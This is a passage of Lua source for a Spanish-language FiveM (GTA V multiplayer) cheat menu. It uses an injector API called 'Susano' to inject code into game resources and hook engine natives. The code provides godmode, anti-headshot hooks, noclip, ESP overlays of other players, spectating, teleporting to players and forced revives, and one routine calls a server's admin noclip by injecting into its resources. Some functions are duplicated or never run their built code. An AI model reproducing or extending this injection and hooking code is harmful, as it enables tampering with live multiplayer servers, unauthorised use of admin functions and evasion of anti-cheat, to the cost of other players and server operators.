                                    return item
                                end
                            end
                        end
                    end
                elseif cat.items and type(cat.items) == "table" and (tabName == nil or tabName == "") then
                    for _, item in ipairs(cat.items) do
                        if item and type(item) == "table" and item.name == itemName then
                            return item
                        end
                    end
                end
            end
        end
        return nil
    end)

    if success then
        return result
    else
        print("Error en FindItem: " .. tostring(result))
        return nil
    end
end

local lastNoclipSpeed = 1.0
local noclipType = "normal"

local spectateActive = false
local spectateCamera = nil

local function ToggleSpectate(enable)
    if enable then
        if not Menu.SelectedPlayer then
            Menu.PlayerListSpectateEnabled = false
            return
        end

        spectateActive = true
        local targetServerId = Menu.SelectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                local targetServerId = %d
                local spectateThreadActive = true
                local playerPed = PlayerPedId()

                CreateThread(function()
                    while spectateThreadActive do
                        Wait(0)

                        local targetPlayerId = nil
                        for _, player in ipairs(GetActivePlayers()) do
                            if GetPlayerServerId(player) == targetServerId then
                                targetPlayerId = player
                                break
                            end
                        end

                        if targetPlayerId then
                            local targetPed = GetPlayerPed(targetPlayerId)
                            if DoesEntityExist(targetPed) then
                                NetworkSetInSpectatorMode(true, targetPed)
                            else
                                spectateThreadActive = false
                                NetworkSetInSpectatorMode(false, playerPed)
                                break
                            end
                        else
                            spectateThreadActive = false
                            NetworkSetInSpectatorMode(false, playerPed)
                            break
                        end
                    end

                    NetworkSetInSpectatorMode(false, playerPed)
                end)

                rawset(_G, 'spectate_thread_active_' .. targetServerId, function()
                    spectateThreadActive = false
                    NetworkSetInSpectatorMode(false, playerPed)
                end)
            ]], targetServerId))
        end
    else
        spectateActive = false
        Menu.PlayerListSpectateEnabled = false

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local targetServerId = Menu.SelectedPlayer
            if targetServerId then
                Susano.InjectResource("any", string.format([[
                    local stopFunction = rawget(_G, 'spectate_thread_active_' .. %d)
                    if stopFunction then
                        stopFunction()
                        rawset(_G, 'spectate_thread_active_' .. %d, nil)
                    end
                    NetworkSetInSpectatorMode(false, PlayerPedId())
                ]], targetServerId, targetServerId))
            else
                Susano.InjectResource("any", [[
                    NetworkSetInSpectatorMode(false, PlayerPedId())
                ]])
            end
        end
    end
end

local function UpdatePlayerList()
    for _, cat in ipairs(Menu.Categories) do
        if cat.name == "En linea" and cat.tabs then
            for tabIdx, tab in ipairs(cat.tabs) do
                if tab.name == "Lista de jugadores" then
                    for _, item in ipairs(tab.items) do
                        if item.type == "selector" then
                            if item.name == "Select" then
                                Menu.PlayerListSelectIndex = item.selected or 1
                            elseif item.name == "Teleport" then
                                Menu.PlayerListTeleportIndex = item.selected or 1
                            elseif item.name == "Type" then
                                Menu.PlayerListTypeIndex = item.selected or 1
                            end
                        elseif item.type == "toggle" and item.name == "Spectate Player" then
                            Menu.PlayerListSpectateEnabled = item.value or false
                        end
                    end

                    tab.items = {}

                    Actions.spectateItem = {
                        name = "Espectar jugador",
                        type = "toggle",
                        value = Menu.PlayerListSpectateEnabled
                    }
                    Actions.spectateItem.onClick = function(value)
                        Menu.PlayerListSpectateEnabled = value
                        ToggleSpectate(value)
                    end
                    table.insert(tab.items, Actions.spectateItem)

                    Actions.teleportItem = {
                        name = "Teletransporte",
                        type = "selector",
                        options = {"Al jugador", "Al vehiculo"},
                        selected = Menu.PlayerListTeleportIndex
                    }
                    Actions.teleportItem.onClick = function(index, option)
                        if not Menu.SelectedPlayer then return end

                        if index == 1 then
                            for _, player in ipairs(GetActivePlayers()) do
                                if GetPlayerServerId(player) == Menu.SelectedPlayer then
                                    local targetPed = GetPlayerPed(player)
                                    if DoesEntityExist(targetPed) then
                                        local coords = GetEntityCoords(targetPed)
                                        SetEntityCoords(PlayerPedId(), coords.x, coords.y, coords.z)
                                    end
                                    break
                                end
                            end
                        elseif index == 2 then
                            for _, player in ipairs(GetActivePlayers()) do
                                if GetPlayerServerId(player) == Menu.SelectedPlayer then
                                    local targetPed = GetPlayerPed(player)
                                    if DoesEntityExist(targetPed) then
                                        local vehicle = GetVehiclePedIsIn(targetPed, false)
                                        if vehicle and vehicle ~= 0 then
                                            TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -2)
                                        end
                                    end
                                    break
                                end
                            end
                        end
                    end
                    table.insert(tab.items, Actions.teleportItem)

                    local localPed = PlayerPedId()
                    if not localPed or localPed == 0 then return end

                    local localCoords = GetEntityCoords(localPed)
                    local myPlayerId = PlayerId()
                    local myServerId = GetPlayerServerId(myPlayerId)
                    local myName = GetPlayerName(myPlayerId)

                    local otherPlayers = {}
                    local typeFilter = Menu.PlayerListTypeIndex or 1
                    for _, player in ipairs(GetActivePlayers()) do
                        if player ~= myPlayerId then
                            local targetPed = GetPlayerPed(player)
                            if targetPed and DoesEntityExist(targetPed) then
                                local isInVehicle = IsPedInAnyVehicle(targetPed, false)
                                local shouldShow = false
                                
                                if typeFilter == 1 then
                                    shouldShow = true
                                elseif typeFilter == 2 then
                                    shouldShow = not isInVehicle
                                elseif typeFilter == 3 then
                                    shouldShow = isInVehicle
                                end
                                
                                if shouldShow then
                                    local targetCoords = GetEntityCoords(targetPed)
                                    local distance = #(localCoords - targetCoords)

                                    local playerId = GetPlayerServerId(player)
                                    local playerName = GetPlayerName(player)
                                    table.insert(otherPlayers, {
                                        id = playerId,
                                        name = playerName,
                                        distance = math.floor(distance)
                                    })
                                end
                            end
                        end
                    end

                    table.sort(otherPlayers, function(a, b) return a.distance < b.distance end)

                    Actions.selectModeItem = {
                        name = "Seleccionar",
                        type = "selector",
                        options = {"Seleccionar todos", "Deseleccionar todos"},
                        selected = Menu.PlayerListSelectIndex
                    }
                    Actions.selectModeItem.onClick = function(index, option)
                        if index == 1 then
                            Menu.SelectedPlayers = {}
                            table.insert(Menu.SelectedPlayers, myServerId)
                            Menu.SelectedPlayer = myServerId
                            for _, playerData in ipairs(otherPlayers) do
                                table.insert(Menu.SelectedPlayers, playerData.id)
                            end
                        elseif index == 2 then
                            Menu.SelectedPlayer = nil
                            Menu.SelectedPlayers = {}
                        end
                    end
                    table.insert(tab.items, Actions.selectModeItem)

                    Menu.PlayerListTypeIndex = Menu.PlayerListTypeIndex or 1
                    Actions.typeItem = {
                        name = "Tipo",
                        type = "selector",
                        options = {"Ninguno", "A pie", "En vehiculo"},
                        selected = Menu.PlayerListTypeIndex
                    }
                    Actions.typeItem.onClick = function(index, option)
                        Menu.PlayerListTypeIndex = index
                    end
                    table.insert(tab.items, Actions.typeItem)

                    table.insert(tab.items, {
                        name = "",
                        isSeparator = true,
                        separatorText = "Lista de jugadores"
                    })

                    local function isPlayerSelected(playerId)
                        for _, selectedId in ipairs(Menu.SelectedPlayers) do
                            if selectedId == playerId then
                                return true
                            end
                        end
                        return false
                    end

                    local function togglePlayerSelection(playerId)
                        local found = false
                        for i, selectedId in ipairs(Menu.SelectedPlayers) do
                            if selectedId == playerId then
                                table.remove(Menu.SelectedPlayers, i)
                                found = true
                                break
                            end
                        end
                        if not found then
                            table.insert(Menu.SelectedPlayers, playerId)
                            Menu.SelectedPlayer = playerId
                        else
                            if Menu.SelectedPlayer == playerId then
                                Menu.SelectedPlayer = Menu.SelectedPlayers[1] or nil
                            end
                        end
                    end

                    local myPed = PlayerPedId()
                    local myIsInVehicle = IsPedInAnyVehicle(myPed, false)
                    local shouldShowSelf = false
                    
                    if typeFilter == 1 then
                        shouldShowSelf = true
                    elseif typeFilter == 2 then
                        shouldShowSelf = not myIsInVehicle
                    elseif typeFilter == 3 then
                        shouldShowSelf = myIsInVehicle
                    end
                    
                    if shouldShowSelf then
                        local selfToggle = {
                            name = myName .. " (Tu)",
                            type = "toggle",
                            value = isPlayerSelected(myServerId),
                            playerId = myServerId,
                            isSelf = true
                        }
                        selfToggle.onClick = function(value)
                            togglePlayerSelection(selfToggle.playerId)
                        end
                        table.insert(tab.items, selfToggle)
                    end

                    for _, playerData in ipairs(otherPlayers) do
                        local playerToggle = {
                            name = playerData.name .. " (" .. playerData.distance .. "m)",
                            type = "toggle",
                            value = isPlayerSelected(playerData.id),
                            playerId = playerData.id
                        }
                        playerToggle.onClick = function(value)
                            togglePlayerSelection(playerToggle.playerId)
                        end
                        table.insert(tab.items, playerToggle)
                    end

                    return
                end
            end
        end
    end
end

Citizen.CreateThread(function()
    Wait(500)
    while true do
        UpdatePlayerList()
        Wait(0)
    end
end)

Menu.OnRender = function()
    Actions.noclipItem = FindItem("Jugador", "Movimiento", "Noclip")
    if Actions.noclipItem and Actions.noclipItem.value then
        local currentSpeed = Actions.noclipItem.sliderValue or 1.0
        if lastNoclipSpeed ~= currentSpeed then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", string.format([[
                    if _G then
                        _G.NoclipSpeed = %s
                    end
                ]], tostring(currentSpeed)))
            end
            lastNoclipSpeed = currentSpeed
        end
    end

    if not espSettings then espSettings = GetESPSettings() end
    if not worldSettings then worldSettings = GetWorldSettings() end

    RenderWorldVisuals(worldSettings)

    local drawSelf = espSettings["Dibujarme"] and espSettings["Dibujarme"].value
    local enablePlayerESP = espSettings["Activar ESP"] and espSettings["Activar ESP"].value

    if drawSelf or enablePlayerESP then
        Menu.PreventResetFrame = true

        local ped = PlayerPedId()
        local screenW, screenH = GetScreenSize()
        if not screenW or not screenH then return end

        local myPos = GetEntityCoords(ped)

        if drawSelf then
            RenderPedESP(ped, PlayerId(), espSettings, screenW, screenH, myPos)
        end

        if enablePlayerESP then

            local players = {}
            for _, player in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(player)
                if targetPed and targetPed ~= 0 and targetPed ~= ped and DoesEntityExist(targetPed) then
                    local targetPos = GetEntityCoords(targetPed)
                    local dist = #(myPos - targetPos)
                    if dist <= 10000.0 then
                        table.insert(players, {player = player, ped = targetPed, dist = dist})
                    end
                end
            end

            table.sort(players, function(a, b) return a.dist < b.dist end)

            for _, data in ipairs(players) do
                RenderPedESP(data.ped, data.player, espSettings, screenW, screenH, myPos)
            end

            local currentTime = GetGameTimer() or 0
            if currentTime - ESPCacheTime > 1000 then
                ESPCacheTime = currentTime
                for k, v in pairs(ESPCache) do
                    if v.time and (currentTime - v.time) > 2000 then
                        ESPCache[k] = nil
                    end
                end
            end
        end
    else
        Menu.PreventResetFrame = false
    end
end

local godmodeActive = false
local godmodeThread = nil

local function ToggleFullGodmode(enable)
    if enable == godmodeActive then return end
    godmodeActive = enable

    if enable then
        godmodeThread = Citizen.CreateThread(function()
            local player = PlayerId()
            local ped = PlayerPedId()
            while godmodeActive do
                SetPlayerInvincible(player, true)
                SetEntityInvincible(ped, true)
                SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                SetPedCanRagdoll(ped, false)
                SetPedRagdollOnCollision(ped, false)
                SetEntityHealth(ped, GetEntityMaxHealth(ped))
                Citizen.Wait(0)
            end
            SetPlayerInvincible(player, false)
            SetEntityInvincible(ped, false)
            SetEntityProofs(ped, false, false, false, false, false, false, false, false)
            SetPedCanRagdoll(ped, true)
            SetPedRagdollOnCollision(ped, true)
        end)
    else
        godmodeActive = false
        if godmodeThread then
            Citizen.StopThread(godmodeThread)
            godmodeThread = nil
        end
        local player = PlayerId()
        local ped = PlayerPedId()
        SetPlayerInvincible(player, false)
        SetEntityInvincible(ped, false)
        SetEntityProofs(ped, false, false, false, false, false, false, false, false)
        SetPedCanRagdoll(ped, true)
        SetPedRagdollOnCollision(ped, true)
    end
end

local function ToggleSemiGodmode(enable)
end

local function ToggleSemiGodmode(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    local code = string.format([[
        local susano = rawget(_G, "Susano")

        if _G.SemiGodmodeEnabled == nil then _G.SemiGodmodeEnabled = false end
        _G.SemiGodmodeEnabled = %s

        if not _G.SemiGodmodeHooksInstalled and susano and type(susano.HookNative) == "function" then
            _G.SemiGodmodeHooksInstalled = true

            susano.HookNative(0xFAEE099C6F890BB8, function(entity)
                if _G.SemiGodmodeEnabled and entity == PlayerPedId() then
                    return false, false, false, false, false, false, false, false
                end
                return true
            end)

            susano.HookNative(0x697157CED63F18D4, function(ped, damage, armorDamage)
                if _G.SemiGodmodeEnabled and ped == PlayerPedId() then
                    return false
                end
                return true
            end)

            susano.HookNative(0x6B76DC1F3AE6E6A3, function(entity, health)
                if _G.SemiGodmodeEnabled and entity == PlayerPedId() then
                    local maxHealth = GetEntityMaxHealth(entity)
                    if health < maxHealth then
                        return false
                    end
                end
                return true
            end)

            susano.HookNative(0x7C6BCA42, function(ped)
                if _G.SemiGodmodeEnabled and ped == PlayerPedId() then
                    return false
                end
                return true
            end)
        end

        if not _G.SemiGodmodeLoopStarted then
            _G.SemiGodmodeLoopStarted = true
            _G.LastHealth = nil

            if susano and type(susano.HookNative) == "function" then
                susano.HookNative(0xFAEE099C6F890BB8, function(entity)
                    if _G.SemiGodmodeEnabled and entity == PlayerPedId() then
                        return false, false, false, false, false, false, false, false
                    end
                    return true
                end)
            end

            Citizen.CreateThread(function()
                while true do
                    Wait(200)
                    if _G.SemiGodmodeEnabled then
                        local ped = PlayerPedId()
                        if not DoesEntityExist(ped) then goto continue end

                        local currentHealth = GetEntityHealth(ped)
                        local maxHealth = GetEntityMaxHealth(ped)

                        if currentHealth < maxHealth then
                            local regenAmount = math.min(3, maxHealth - currentHealth)
                            SetEntityHealth(ped, currentHealth + regenAmount)
                        end

                        if math.random(1, 10) == 1 then
                            ClearPedBloodDamage(ped)
                            ResetPedVisibleDamage(ped)
                        end

                        _G.LastHealth = currentHealth

                        ::continue::
                    end
                end
            end)

            Citizen.CreateThread(function()
                while true do
                    Wait(10)
                    if _G.SemiGodmodeEnabled then
                        local ped = PlayerPedId()
                        if not DoesEntityExist(ped) then goto continue end

                        local currentHealth = GetEntityHealth(ped)
                        local maxHealth = GetEntityMaxHealth(ped)

                        if _G.LastHealth and currentHealth < _G.LastHealth then
                            local damageTaken = _G.LastHealth - currentHealth
                            if damageTaken > 10 then
                                SetEntityHealth(ped, maxHealth)
                            elseif damageTaken > 5 then
                                local regenAmount = math.min(20, maxHealth - currentHealth)
                                SetEntityHealth(ped, currentHealth + regenAmount)
                            end
                        end

                        if currentHealth < (maxHealth * 0.8) then
                            local regenAmount = math.min(15, maxHealth - currentHealth)
                            SetEntityHealth(ped, currentHealth + regenAmount)
                        end

                        if currentHealth < (maxHealth * 0.5) then
                            SetEntityHealth(ped, maxHealth)
                        end

                        _G.LastHealth = currentHealth

                        ::continue::
                    end
                end
            end)
        end
    ]], tostring(enable))
end

local function SetEntityScale(entity, scale)
    if _G.SetEntityScale then
        return _G.SetEntityScale(entity, scale)
    end
    return Citizen.InvokeNative(0x25223CA6B4D20B7F, entity, scale)
end

local function ToggleTinyPlayer(enable)
    local ped = PlayerPedId()
    if enable then
        SetPedConfigFlag(ped, 223, true)
        SetEntityScale(ped, 0.5)
    else
        SetPedConfigFlag(ped, 223, false)
        SetEntityScale(ped, 1.0)
    end
end

local function HSVToRGB(h, s, v)
    local r, g, b
    local i = math.floor(h * 6)
    local f = h * 6 - i
    local p = v * (1 - s)
    local q = v * (1 - f * s)
    local t = v * (1 - (1 - f) * s)
    i = i % 6
    if i == 0 then r, g, b = v, t, p
    elseif i == 1 then r, g, b = q, v, p
    elseif i == 2 then r, g, b = p, v, t
    elseif i == 3 then r, g, b = p, q, v
    elseif i == 4 then r, g, b = t, p, v
    elseif i == 5 then r, g, b = v, p, q
    end
    return math.floor(r * 255), math.floor(g * 255), math.floor(b * 255)
end

local rainbowPaintActive = false
local function ToggleRainbowPaint(enable)
    rainbowPaintActive = enable
    if enable then
        Citizen.CreateThread(function()
            local hue = 0.0
            while rainbowPaintActive do
                local ped = PlayerPedId()
                if IsPedInAnyVehicle(ped, false) then
                    local veh = GetVehiclePedIsIn(ped, false)

                    hue = hue + 0.01
                    if hue > 1.0 then hue = 0.0 end

                    local r, g, b = HSVToRGB(hue, 1.0, 1.0)

                    SetVehicleCustomPrimaryColour(veh, r, g, b)
                    SetVehicleCustomSecondaryColour(veh, r, g, b)
                end
                Citizen.Wait(10)
            end
        end)
    end
end

local function ToggleAntiHeadshot(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    local code = string.format([[
        local susano = rawget(_G, "Susano")

        if _G.AntiHeadshotEnabled == nil then _G.AntiHeadshotEnabled = false end
        _G.AntiHeadshotEnabled = %s

        if not _G.AntiHeadshotHooksInstalled and susano and type(susano.HookNative) == "function" then
            _G.AntiHeadshotHooksInstalled = true

            susano.HookNative(0x2D343D2219CD027A, function(ped, toggle)
                if _G.AntiHeadshotEnabled and ped == PlayerPedId() and toggle == true then
                    return false
                end
                return true
            end)

            susano.HookNative(0xD75960F6BD9EA49C, function(ped, bonePtr)
                return true
            end)
        end

        if not _G.AntiHeadshotLoopStarted then
            _G.AntiHeadshotLoopStarted = true
            Citizen.CreateThread(function()
                while true do
                    Wait(0)
                    if _G.AntiHeadshotEnabled then
                        local ped = PlayerPedId()
                        SetPedSuffersCriticalHits(ped, false)
                    end
                end
            end)
        end
    ]], tostring(enable))

    Susano.InjectResource("any", code)
end

local noclipVersion = 0

local function ToggleNoclipStaff(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    if enable then
        Susano.InjectResource("Putin", [[
            if AdminSystem and AdminSystem.NoClip and AdminSystem.NoClip.Enable then
                AdminSystem.NoClip.Enable()
            end
        ]])
    else
        Susano.InjectResource("Putin", [[
            if AdminSystem and AdminSystem.NoClip and AdminSystem.NoClip.Disable then
                AdminSystem.NoClip.Disable()
            end
        ]])
    end
end

local function ToggleNoclip(enable, speed)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    speed = speed or 1.0

    noclipVersion = noclipVersion + 1
    local currentVersion = noclipVersion

    local code = string.format([[
        local susano = rawget(_G, "Susano")

        _G.NoclipEnabled = %s
        _G.NoclipSpeed = %s
        _G.NoclipVersion = %s

        if not _G.NoclipEnabled then
            _G.NoclipStopAll = true
            Wait(100)
            local ped = PlayerPedId()
            if DoesEntityExist(ped) then
                SetEntityCollision(ped, true, true)
                FreezeEntityPosition(ped, false)

                local vehicle = GetVehiclePedIsIn(ped, false)
                if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                    SetEntityCollision(vehicle, true, true)
                    FreezeEntityPosition(vehicle, false)
                end
            end
            Wait(100)
            _G.NoclipStopAll = false
            _G.NoclipEnabled = false
        else
        if not _G.NoclipHooksInstalled and susano and type(susano.HookNative) == "function" then
            _G.NoclipHooksInstalled = true

            susano.HookNative(0xC5F68BE37759D056, function(entity)
                if _G.NoclipEnabled then
                    local ped = PlayerPedId()
                    if entity == ped then
                        return false
                    end
                    local vehicle = GetVehiclePedIsIn(ped, false)
                    if vehicle and vehicle ~= 0 and entity == vehicle then
                        return false
                    end
                end
                return true
            end)
        end

            CreateThread(function()
                local myVersion = %s
                local mySpeed = %s

                while true do
                    Wait(0)

                    if _G.NoclipStopAll or ( _G.NoclipVersion and _G.NoclipVersion ~= myVersion) or not _G.NoclipEnabled then
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) then
                            SetEntityCollision(ped, true, true)
                            FreezeEntityPosition(ped, false)

                            local vehicle = GetVehiclePedIsIn(ped, false)
                            if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                                SetEntityCollision(vehicle, true, true)
                                FreezeEntityPosition(vehicle, false)
                            end
                        end
                        _G.NoclipEnabled = false
                        break
                    end

                    local ped = PlayerPedId()
                    if not DoesEntityExist(ped) then
                        Wait(100)
                    else
                        local vehicle = GetVehiclePedIsIn(ped, false)
                        local entity = vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) and vehicle or ped

                        SetEntityCollision(entity, false, false)
                        FreezeEntityPosition(entity, true)

                        local coords = GetEntityCoords(entity)
                        local camRot = GetGameplayCamRot(2)

                        local pitch = math.rad(camRot.x)
                        local yaw = math.rad(camRot.z)

                        local vx = -math.sin(yaw) * math.abs(math.cos(pitch))
                        local vy = math.cos(yaw) * math.abs(math.cos(pitch))
                        local vz = math.sin(pitch)

                        local rx = math.cos(yaw)
                        local ry = math.sin(yaw)

                        local currentSpeed = mySpeed
                        if _G and _G.NoclipSpeed then
                            currentSpeed = _G.NoclipSpeed
                        end

                        local moveSpeed = currentSpeed
                        if IsControlPressed(0, 21) or IsDisabledControlPressed(0, 21) then
                            moveSpeed = currentSpeed * 2.5
                        end

                        local newPos = coords

                        if IsControlPressed(0, 32) then
                            newPos = vector3(newPos.x + vx * moveSpeed, newPos.y + vy * moveSpeed, newPos.z + vz * moveSpeed)
                        end
                        if IsControlPressed(0, 33) then
                            newPos = vector3(newPos.x - vx * moveSpeed, newPos.y - vy * moveSpeed, newPos.z - vz * moveSpeed)
                        end
                        if IsControlPressed(0, 34) then
                            newPos = vector3(newPos.x - rx * moveSpeed, newPos.y - ry * moveSpeed, newPos.z)
                        end
                        if IsControlPressed(0, 35) then
                            newPos = vector3(newPos.x + rx * moveSpeed, newPos.y + ry * moveSpeed, newPos.z)
                        end

                        if IsControlPressed(0, 22) then
                            newPos = vector3(newPos.x, newPos.y, newPos.z + moveSpeed)
                        end
                        if IsControlPressed(0, 36) then
                            newPos = vector3(newPos.x, newPos.y, newPos.z - moveSpeed)
                        end

                        SetEntityCoordsNoOffset(entity, newPos.x, newPos.y, newPos.z, true, true, true)
                        if entity == ped then
                            SetEntityHeading(ped, camRot.z)
                        end
                    end
                end
            end)
        end
    ]], tostring(enable), tostring(speed), tostring(currentVersion), tostring(currentVersion), tostring(speed))

    Susano.InjectResource("any", code)
end

function Menu.ActionRevive()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        local ped = PlayerPedId()
        if not ped or not DoesEntityExist(ped) then return end

        local coords = GetEntityCoords(ped)
        local heading = GetEntityHeading(ped)

        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        SetEntityHealth(ped, 200)
        return
    end

    Susano.InjectResource("any", [[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end

        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
        hNative("NetworkResurrectLocalPlayer", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityHealth", function(originalFn, ...) return originalFn(...) end)

        local ped = PlayerPedId()
        if not ped or not DoesEntityExist(ped) then return end

        local coords = GetEntityCoords(ped)
        local heading = GetEntityHeading(ped)

        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
        SetEntityHealth(ped, 200)
        ClearPedBloodDamage(ped)
        ClearPedTasksImmediately(ped)
        SetPlayerInvincible(PlayerId(), false)
        SetEntityInvincible(ped, false)
        SetPedCanRagdoll(ped, true)
        SetPedCanRagdollFromPlayerImpact(ped, true)
        SetPedRagdollOnCollision(ped, true)

        if GetResourceState("scripts") == 'started' then
            TriggerEvent('deathscreen:revive')
        end

        if GetResourceState("framework") == 'started' then
            TriggerEvent('deathscreen:revive')
        end

        if GetResourceState("qb-jail") == 'started' then
            TriggerEvent('hospital:client:Revive')
        end
    ]])
end

function Menu.ActionMaxHealth()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetEntityHealth(ped, 200)
        end
        return
    end

    Susano.InjectResource("any", [[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end

        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityHealth", function(originalFn, ...) return originalFn(...) end)

        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetEntityHealth(ped, 200)
        end
    ]])
end

function Menu.ActionMaxArmor()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetPedArmour(ped, 100)
        end
        return
    end

    Susano.InjectResource("any", [[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end

        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        hNative("SetPedArmour", function(originalFn, ...) return originalFn(...) end)

        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            SetPedArmour(ped, 100)
        end
    ]])
end

function Menu.ActionDetachAllEntitys()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            ClearPedTasks(ped)
            DetachEntity(ped, true, true)
        end
        return
    end

    Susano.InjectResource("any", [[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end

        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
        hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
        hNative("DetachEntity", function(originalFn, ...) return originalFn(...) end)

        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) then
            ClearPedTasks(ped)
            DetachEntity(ped, true, true)
        end
    ]])
end

local function ToggleSoloSession(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        if enable then
            NetworkStartSoloTutorialSession()
        else
            NetworkEndTutorialSession()
        end
        return
    end

    local code = string.format([[
        local function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then return end
            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
        end

        hNative("NetworkStartSoloTutorialSession", function(originalFn, ...) return originalFn(...) end)
        hNative("NetworkEndTutorialSession", function(originalFn, ...) return originalFn(...) end)

        if %s then
            NetworkStartSoloTutorialSession()
        else
            NetworkEndTutorialSession()
        end
    ]], tostring(enable))

    Susano.InjectResource("any", code)
end

local function ToggleFastRun(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    local code = string.format([[
        if _G.FastRunActive == nil then _G.FastRunActive = false end
        _G.FastRunActive = %s

        if not _G.FastRunLoopStarted then
            _G.FastRunLoopStarted = true
            Citizen.CreateThread(function()
                while true do
                    Wait(0)
                    if _G.FastRunActive then
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                            SetPedMoveRateOverride(ped, 1.49)
                        end
                    else
                        Wait(500)
                    end
                end
            end)
        end

        if not _G.FastRunActive then
            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
            SetPedMoveRateOverride(PlayerPedId(), 1.0)
        end
    ]], tostring(enable))

    Susano.InjectResource("any", code)
end

local function ToggleNoRagdoll(enable)
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end

    local code = string.format([[
        local susano = rawget(_G, "Susano")

        if _G.NoRagdollEnabled == nil then _G.NoRagdollEnabled = false end
        _G.NoRagdollEnabled = %s

        if not _G.NoRagdollHooksInstalled and susano and type(susano.HookNative) == "function" then
            if susano.HasNativeHookInitializationFailed and susano.HasNativeHookInitializationFailed() then
                return
            end

            _G.NoRagdollHooksInstalled = true

            susano.HookNative(0xAE99FB955581844A, function(ped)
                if _G.NoRagdollEnabled and ped == PlayerPedId() then
                    return false
                end
                return true
            end)

            susano.HookNative(0xD76632D99E4966C8, function(ped)
                if _G.NoRagdollEnabled and ped == PlayerPedId() then
                    return false
                end
                return true
            end)
        end

        if not _G.NoRagdollLoopStarted then
            _G.NoRagdollLoopStarted = true
            Citizen.CreateThread(function()
                while true do
                    Wait(0)
                    if _G.NoRagdollEnabled then
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetPedCanRagdoll(ped, false)
                            SetPedRagdollOnCollision(ped, false)
                            SetPedCanRagdollFromPlayerImpact(ped, false)
                            if IsPedRagdoll(ped) then
                                ClearPedTasksImmediately(ped)
                            end
                        end
                    else
                        Wait(500)
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 then
                            SetPedCanRagdoll(ped, true)
                            SetPedRagdollOnCollision(ped, true)
                            SetPedCanRagdollFromPlayerImpact(ped, true)
                        end
                    end
                end
            end)
        end
    ]], tostring(enable))

    Susano.InjectResource("any", code)
end

function Menu.ActionRandomOutfit()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        local ped = PlayerPedId()
        if not ped or not DoesEntityExist(ped) then return end

        local torsoMax = GetNumberOfPedDrawableVariations(ped, 11)
        local shoesMax = GetNumberOfPedDrawableVariations(ped, 6)
        local pantsMax = GetNumberOfPedDrawableVariations(ped, 4)

        SetPedComponentVariation(ped, 11, math.random(0, torsoMax - 1), 0, 2)
        SetPedComponentVariation(ped, 6, math.random(0, shoesMax - 1), 0, 2)
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        SetPedComponentVariation(ped, 3, 0, 0, 2)
        SetPedComponentVariation(ped, 4, math.random(0, pantsMax - 1), 0, 2)

        ClearPedProp(ped, 0)
        ClearPedProp(ped, 1)
        return
    end
